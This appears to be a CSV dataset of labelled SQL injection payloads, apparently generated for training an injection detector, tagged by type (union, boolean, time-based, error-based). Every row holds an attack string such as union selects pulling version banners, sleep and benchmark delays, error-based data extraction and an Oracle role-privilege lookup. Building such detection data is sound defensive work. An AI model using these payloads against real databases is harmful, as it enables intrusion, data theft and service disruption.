id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_000051,attack,union," select * from users where id  =  '1' or   (  \.  )    =  1 union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000248,0.02616007478261204
SMOTE_000052,attack,time,select pg_sleep  (  5  )   and 'qfaz' like 'qfaz,nearest_attack_euclidean,R008084,2.0156938893765357
SMOTE_000053,attack,union,"1""  )   where 2088  =  2088 union all select null,null,null,null--",nearest_attack_euclidean,R004771,0.0025788626688949797
SMOTE_000054,attack,time,"1""  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  ""fkmh""  =  ""fkmh",nearest_attack_euclidean,R008979,0.04031256841132658
SMOTE_000055,attack,union,"-8358'   )    )     )   union all select 7282,7282--",nearest_attack_euclidean,R007235,0.0009933932245219264
SMOTE_000056,attack,union,"-7083 union all select 7705,7705,7705,7705,7705#",nearest_attack_euclidean,R006666,0.18458311727982038
SMOTE_000057,attack,boolean,-2983'  )   or 8571  =  8571--,nearest_attack_euclidean,R006161,1.4600096599955427e-07
SMOTE_000058,attack,union," select * from users where id  =  '1'   union select null,banner from v$version where rownum  =  1 -- 1'",nearest_attack_euclidean,R000387,1.2555602535659431
SMOTE_000059,attack,boolean,-4289' or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and 'agnc' like 'agnc,nearest_attack_euclidean,R004905,0.9848198839643936
SMOTE_000060,attack,union,"1""   )    )    union all select null,null,null,null#",nearest_attack_euclidean,R005525,0.16092155650070536
SMOTE_000061,attack,boolean,1'||  (  select 'boxx' where 2038  =  2038 and 9198  =  9198--,nearest_attack_euclidean,R003110,0.2757685335696187
SMOTE_000062,attack,other,"1""  )   where 9447  =  9447",nearest_attack_euclidean,R001229,0.0
SMOTE_000063,attack,time,1' rlike sleep  (  5  )   and 'cugs'  =  'cugs,nearest_attack_euclidean,R001782,0.0019801895814028966
SMOTE_000064,attack,union,"1   )    )     )   union all select null,null,null,null--",nearest_attack_euclidean,R007872,0.016465606256113367
SMOTE_000065,attack,boolean,-3634%'   )    )    or 2671  =  2434,nearest_attack_euclidean,R005672,0.027730083907264398
SMOTE_000066,attack,other,"1""  )   as hsws where 6656  =  6656",nearest_attack_euclidean,R004999,0.050405604764750284
SMOTE_000067,attack,time,"1""   )    )    or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #",nearest_attack_euclidean,R002975,0.20771348206310025
SMOTE_000068,attack,union,"-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#",nearest_attack_euclidean,R005422,0.2640994440307315
SMOTE_000069,attack,other,1'||  (  select 'xhcr' from dual where 9279  =  9279,nearest_attack_euclidean,R001619,0.0047801883652275
SMOTE_000070,attack,other,select   (  case when   (  6969  =  5797  )   then 6969 else 6969*  (  select 6969 from information_schema.character_sets  )   end  )  #,nearest_attack_euclidean,R006470,0.06905340287607475
SMOTE_000071,attack,union,"-4318""  )   as vpvt where 5543  =  5543 union all select 5543,5543,5543,5543,5543,5543--",nearest_attack_euclidean,R004523,0.23206676542229968
SMOTE_000072,attack,boolean,"-1583'  )   or elt  (  1032  =  1032,3623  )   and   (  'jrcj' like 'jrcj",nearest_attack_euclidean,R004987,0.24667728206868494
SMOTE_000073,attack,union,"1%'  )   union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R005459,0.1916288265034979
SMOTE_000074,attack,boolean,"1""  )   where 6671  =  6671 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R000745,0.08092753510252894
SMOTE_000075,attack,boolean,"1'||  (  select 'gwxc' from dual where 3626  =  3626 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R001824,0.6950676488989354
SMOTE_000076,attack,boolean,select * from users where id  =  '1' or $ 1  =  1 or 1  =  1 -- 1',nearest_attack_euclidean,R000168,0.7821729563025641
SMOTE_000077,attack,union," select * from users where id  =  '1' union select $*$,@@VERSION -- 1'",nearest_attack_euclidean,R000034,0.1513340635743321
SMOTE_000078,attack,time,"1'  )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R002040,0.04947126768959774
SMOTE_000079,attack,boolean,end and 'icny' like 'icny,nearest_attack_euclidean,R004841,0.14475358808420324
SMOTE_000080,attack,time,1%'  )   and sleep  (  5  )   and   (  '%'  =  ',nearest_attack_euclidean,R006467,0.44521262516678056
SMOTE_000081,attack,boolean,"1 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  ",nearest_attack_euclidean,R006672,0.22435882164491341
SMOTE_000082,attack,union,"1'  )   as ohnu where 4097  =  4097 union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R007200,0.02006633666807287
SMOTE_000083,attack,boolean,-3634%'   )    )    or 2671  =  2434,nearest_attack_euclidean,R005672,0.027922344087739873
SMOTE_000084,attack,time,"1'  )   where 3476  =  3476 and elt  (  1210  =  1210,sleep  (  5   )    )   --",nearest_attack_euclidean,R007146,0.10216768125199072
SMOTE_000085,attack,union,"1'||  (  select 'ukfj' where 7133  =  7133 union all select null,null,null#",nearest_attack_euclidean,R005466,0.14538484499835994
SMOTE_000086,attack,boolean,"1%""   )    )    and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R001257,0.15861067010804736
SMOTE_000087,attack,boolean,1   )    )    as foul where 4361  =  4361 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --,nearest_attack_euclidean,R004529,0.7716917847009203
SMOTE_000088,attack,union,"1%""   )    )     )   union all select null,null,null--",nearest_attack_euclidean,R004216,0.2931420127628579
SMOTE_000089,attack,other,1' where 7036  =  7036,nearest_attack_euclidean,R001285,0.0
SMOTE_000090,attack,other,insert,nearest_attack_euclidean,R000023,4.660878167961483
SMOTE_000091,attack,boolean,-1280'   )    )    or 8571  =  8571--,nearest_attack_euclidean,R007307,0.08201900140008711
SMOTE_000092,attack,union," select * from users where id  =  1 or 1#"". union select null,version  (    )   -- 1",nearest_attack_euclidean,R000056,0.053281201992764565
SMOTE_000093,attack,other,select   (  case when   (  3336  =  9781  )   then 3336 else 1/  (  select 0  )   end  )  --,nearest_attack_euclidean,R004019,0.012857867271347198
SMOTE_000094,attack,boolean,"1'  )   and make_set  (  9961  =  6559,6559  )   and   (  'exde'  =  'exde",nearest_attack_euclidean,R006893,0.17628731363740008
SMOTE_000095,attack,time,1 waitfor delay '0:0:5',nearest_attack_euclidean,R006560,0.39136835768610834
SMOTE_000096,attack,boolean,1'+  (  select 'iqxn' where 1146  =  1146 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )      )    )   +',nearest_attack_euclidean,R003564,0.09839977236950896
SMOTE_000097,attack,error,"1'+  (  select 'sppw' where 1677  =  1677 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  +'",nearest_attack_euclidean,R002851,0.7246823062607834
SMOTE_000098,attack,boolean," select * from users where id  =  1 or ""]{"" or 1  =  1 -- 1",nearest_attack_euclidean,R000041,1.1920928955078125e-07
SMOTE_000099,attack,time,1%'   )    )    or sleep  (  5  )   and    (    (   '%'  =  ',nearest_attack_euclidean,R005519,0.8939321640344058
SMOTE_000100,attack,time,"1'   )    )     )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (     (  'tpeo' like 'tpeo",nearest_attack_euclidean,R001955,0.5118935484965793
SMOTE_000101,attack,boolean,1'  )   and   (  3020  =  3020  )  *6703 and   (  'rskq'  =  'rskq,nearest_attack_euclidean,R003083,0.42492634626259235
SMOTE_000102,attack,union,"1""  )   union all select null,null--",nearest_attack_euclidean,R004851,0.16737180521821785
SMOTE_000103,attack,boolean,select * from users where id  =  '1' or $<\ or 1  =  1 -- 1',nearest_attack_euclidean,R000580,0.42070535728297204
SMOTE_000104,attack,boolean,1  )   and 2006  =  2006,nearest_attack_euclidean,R005698,0.10627932956528623
SMOTE_000105,attack,other,select case when 1892  =  3646 then 1 else null end--,nearest_attack_euclidean,R001090,0.011549407085369447
SMOTE_000106,attack,union,"-7627%""   )    )    union all select 4011,4011,4011,4011,4011,4011,4011,4011,4011,4011--",nearest_attack_euclidean,R008061,0.3886962987847506
SMOTE_000107,attack,union,"-5066'   )    )    union all select 9689,9689,9689,9689#",nearest_attack_euclidean,R007412,0.1267538914526852
SMOTE_000108,attack,union,"1 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R001885,0.23032571876556712
SMOTE_000109,attack,other,1 where 9872  =  9872,nearest_attack_euclidean,R000894,1.6858739404357614e-07
SMOTE_000110,attack,time,1 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   -- fyaq,nearest_attack_euclidean,R002635,0.2952665775929692
SMOTE_000111,attack,boolean,"1' in boolean mode  )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R008244,0.029036553838407097
SMOTE_000112,attack,boolean,"1'   )    )     )   and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R003729,0.0899460538853217
SMOTE_000113,attack,other,1 where 9872  =  9872,nearest_attack_euclidean,R000894,1.6858739404357614e-07
SMOTE_000114,attack,boolean,1%'  )   and 4595  =  4595#,nearest_attack_euclidean,R005394,0.13574507826266502
SMOTE_000115,attack,time,1'+  (  select 'nlvq' where 7528  =  7528 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R001197,0.5326060362281694
SMOTE_000116,attack,error,"-3492"" where 4094  =  4094 or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --",nearest_attack_euclidean,R002460,1.1162510080827954
SMOTE_000117,attack,boolean,"1""   )    )    or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   ""dbxi"" like ""dbxi",nearest_attack_euclidean,R007291,0.01583613124042313
SMOTE_000118,attack,time,select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn,nearest_attack_euclidean,R000755,0.6551752316154928
SMOTE_000119,attack,error,"1  )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  ",nearest_attack_euclidean,R002059,0.8457342110568403
SMOTE_000120,attack,boolean,"1'  )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and   (  'rgue' like 'rgue",nearest_attack_euclidean,R003154,0.23181097806003392
SMOTE_000121,attack,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",nearest_attack_euclidean,R000190,3.371747880871523e-07
SMOTE_000122,attack,boolean,"1%""   )    )     )   and 9198  =  9198--",nearest_attack_euclidean,R004064,0.011695698721731776
SMOTE_000123,attack,union," select * from users where id  =  '1'   union select null,banner from v$version where rownum  =  1 -- 1'",nearest_attack_euclidean,R000387,1.1643586578240464
SMOTE_000124,attack,time,1  )   and sleep  (  5  )   and   (  4855  =  4855,nearest_attack_euclidean,R003944,0.5402659550635677
SMOTE_000125,attack,boolean,"1""  )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  ""ccuy""  =  ""ccuy",nearest_attack_euclidean,R006733,0.016863569415439258
SMOTE_000126,attack,error,"-9011""   )    )    or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000797,0.07030198043815711
SMOTE_000127,attack,boolean,hi' or 1  =  1 --,nearest_attack_euclidean,R000459,0.09762443255853077
SMOTE_000128,attack,union," select * from users where id  =  1 *\ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000173,0.004808629440835709
SMOTE_000129,attack,other,-4057'  )   order by 1#,nearest_attack_euclidean,R001946,0.6976873356179916
SMOTE_000130,attack,time,1'  )   as jdmh where 6175  =  6175 rlike sleep  (  5  )  #,nearest_attack_euclidean,R001267,0.7435672888129778
SMOTE_000131,attack,union,"-9532   )    )    union all select 6039,6039,6039,6039--",nearest_attack_euclidean,R001357,0.24940872599926353
SMOTE_000132,attack,boolean,1' where 3900  =  3900 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --,nearest_attack_euclidean,R002082,0.16047037167947964
SMOTE_000133,attack,boolean,"select count  (  *  )   from generate_series  (  1,5000000  )   and   (  'cewn'  =  'cewn",nearest_attack_euclidean,R002505,0.20797839556256226
SMOTE_000134,attack,time,"1  )   or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R008555,0.27379953281645
SMOTE_000135,attack,union,"1%' union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R001863,0.03955795829758258
SMOTE_000136,attack,boolean,-9556 or   (  2049  =  6967  )  *6967# mhbc,nearest_attack_euclidean,R002502,0.3377447012831473
SMOTE_000137,attack,boolean,"-2790""   )    )    as vcvw where 6075  =  6075 or 7078  =  8148--",nearest_attack_euclidean,R006842,0.1657565889874706
SMOTE_000138,attack,union,"1""   )    )    union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R004895,0.15201497901239577
SMOTE_000139,attack,error,"1""  )   and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and   (  ""mmgx"" like ""mmgx",nearest_attack_euclidean,R002858,0.09047074311672933
SMOTE_000140,attack,boolean,1'+  (  select 'rpds' where 5870  =  5870 and 4595  =  4595#,nearest_attack_euclidean,R005636,0.08009528348835472
SMOTE_000141,attack,boolean,-1879%'   )    )    or 3038  =  3038,nearest_attack_euclidean,R006657,0.17343036566716707
SMOTE_000142,attack,boolean,"1%""   )    )    or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R007066,0.03352097610604292
SMOTE_000143,attack,boolean,-7773' or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  ) ,nearest_attack_euclidean,R008874,0.483995626610742
SMOTE_000144,attack,other,1'   )    )    as nhkp where 8030  =  8030,nearest_attack_euclidean,R001806,2.0733508027703866e-06
SMOTE_000145,attack,boolean,"1' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and 'ggcm' like 'ggcm",nearest_attack_euclidean,R006852,0.07701923655673033
SMOTE_000146,attack,boolean,"1 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  # tcrm",nearest_attack_euclidean,R008546,0.1600648025645696
SMOTE_000147,attack,time,select pg_sleep  (  5  )   and 'zfyy'  =  'zfyy,nearest_attack_euclidean,R002881,0.6840229115676992
SMOTE_000148,attack,other,if  (  3490  =  4920  )   select 3490 else drop function hlzt--,nearest_attack_euclidean,R001051,0.0038073677936745812
SMOTE_000149,attack,union,"1""  )   where 2633  =  2633 union all select null,null,null,null#",nearest_attack_euclidean,R002941,0.3730983451600324
SMOTE_000150,attack,boolean," end and ""xlvn""  =  ""xlvn",nearest_attack_euclidean,R006821,1.1848669941706396
SMOTE_000151,attack,error,"1' where 3612  =  3612 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",nearest_attack_euclidean,R000767,0.06713919375735614
SMOTE_000152,attack,boolean,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (   'wusq'  =  'wusq",nearest_attack_euclidean,R002002,0.04120692060825351
SMOTE_000153,attack,boolean,"1 where 7906  =  7906 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R006084,0.1015022856573891
SMOTE_000154,attack,time,1'  )   as jxtg where 1071  =  1071 and sleep  (  5  )  --,nearest_attack_euclidean,R008458,0.8168562633166322
SMOTE_000155,attack,boolean,1' in boolean mode  )   and 4457  =  3885#,nearest_attack_euclidean,R007438,0.1203449644867891
SMOTE_000156,attack,boolean,"-5245' or elt  (  1032  =  1032,3623  )   and 'qfvo'  =  'qfvo",nearest_attack_euclidean,R006132,0.006391691753845395
